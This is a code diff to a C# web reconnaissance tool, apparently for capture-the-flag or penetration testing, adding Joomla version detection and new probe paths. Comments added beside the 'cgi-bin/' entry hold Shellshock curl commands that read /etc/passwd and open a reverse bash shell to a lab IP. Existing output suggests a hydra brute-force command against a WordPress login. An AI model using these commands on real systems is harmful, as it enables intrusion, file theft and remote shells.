@@ -202,7 +202,6 @@ namespace Reecon
 
         public static string FindCommonFiles(string url)
         {
-            // Console.WriteLine("In FindCommonFiles with " + url);
             string returnText = "";
 
             if (!url.EndsWith("/"))
@@ -215,6 +214,7 @@ namespace Reecon
             int notFoundLength = -1;
             string wildcardURL = url + "be0df04b-f5ff-4b4f-af99-00968cf08fed";
             bool ignoreRedirect = false;
+            bool ignoreForbidden = false;
             try
             {
                 // Console.WriteLine("Testing Wildcard");
@@ -229,6 +229,11 @@ namespace Reecon
                 {
                     ignoreRedirect = true;
                     returnText += $"- Wildcard paths such as {wildcardURL} redirect - This may cause issues..." + Environment.NewLine;
+                }
+                else if (pageResult.StatusCode == HttpStatusCode.Forbidden)
+                {
+                    ignoreForbidden = true;
+                    returnText += $"- Wildcard paths such as {wildcardURL} are forbidden - This may cause issues..." + Environment.NewLine;
                 }
             }
             catch { }
@@ -299,7 +304,12 @@ namespace Reecon
                 // Kibana
                 "app/kibana",
                 // Bolt CMS
-                "bolt-public/img/bolt-logo.png"
+                "bolt-public/img/bolt-logo.png",
+                // Shellshock
+                "cgi-bin/", // Test: curl -H "User-Agent: () { :;}; echo; /bin/cat /etc/passwd;" http://1.2.3.4/cgi-bin/valid.cgi
+                           // Shell: curl -H "User-Agent: () { :;}; echo; /bin/bash -i >& /dev/tcp/10.6.2.249/9001 0>&1;" http://10.10.175.194/cgi-bin/valid.cgi
+                // Well-Known
+                ".well-known/" // https://www.google.com/.well-known/security.txt
             };
 
             if (skipPHP)
@@ -423,8 +433,11 @@ namespace Reecon
                     }
                     else if (response.StatusCode == HttpStatusCode.Forbidden)
                     {
-                        // Forbidden is still useful
-                        returnText += $"- Common Path is Forbidden: {url}{file}" + Environment.NewLine;
+                        // Forbidden is still useful - Unless we're ignoring it
+                        if (!ignoreForbidden)
+                        {
+                            returnText += $"- Common Path is Forbidden: {url}{file}" + Environment.NewLine;
+                        }
                     }
                     else if (response.StatusCode == HttpStatusCode.Redirect || response.StatusCode == HttpStatusCode.Moved)
                     {
@@ -758,6 +771,8 @@ namespace Reecon
                 {
                     responseText += "- Page Text: " + PageText.Trim() + Environment.NewLine;
                 }
+
+                // Wordpress
                 if (PageText.Contains("/wp-content/themes/") && PageText.Contains("/wp-includes/"))
                 {
                     responseText += "- Wordpress detected!" + Environment.NewLine;
@@ -792,6 +807,32 @@ namespace Reecon
                     responseText += $"-- wpscan --url http://{DNS}/ --enumerate u1-5" + Environment.NewLine;
                     responseText += "-- hydra -L users.txt -P passwords.txt site.com http-post-form \"/blog/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location\" -I -t 50" + Environment.NewLine;
                 }
+
+                // Joomla!
+                else if (PageText.Contains("com_content") && PageText.Contains("com_users"))
+                {
+                    responseText += "-- Joomla! Detected".Pastel(Color.Orange) + Environment.NewLine;
+                    var adminXML = GetHTTPInfo($"http://{DNS}/administrator/manifests/files/joomla.xml");
+                    if (adminXML.StatusCode == HttpStatusCode.OK)
+                    {
+                        if (adminXML.PageText.Contains("<version>") && adminXML.PageText.Contains("</version>"))
+                        {
+                            string versionText = adminXML.PageText.Remove(0, adminXML.PageText.IndexOf("<version>") + "<version>".Length);
+                            versionText = versionText.Substring(0, versionText.IndexOf("</version"));
+                            responseText += $"--- Joomla Version: {versionText}".Pastel(Color.Orange) + Environment.NewLine;
+                        }
+                    }
+                    else
+                    {
+                        var tinyXML = GetHTTPInfo($"http://{DNS}/plugins/editors/tinymce/tinymce.xml");
+                        if (tinyXML.StatusCode == HttpStatusCode.OK)
+                        {
+                            // https://joomla.stackexchange.com/questions/7148/how-to-get-joomla-version-by-http
+                            responseText += "- TinyMCE use case hit - Bug Reelix to finish this!" + Environment.NewLine;
+                        }
+                    }
+                }
+                // Icecast
                 else if (PageText.Trim() == "<b>The source you requested could not be found.</b>")
                 {
                     responseText += "-- Possible Icecast Server detected" + Environment.NewLine; // Thanks nmap!
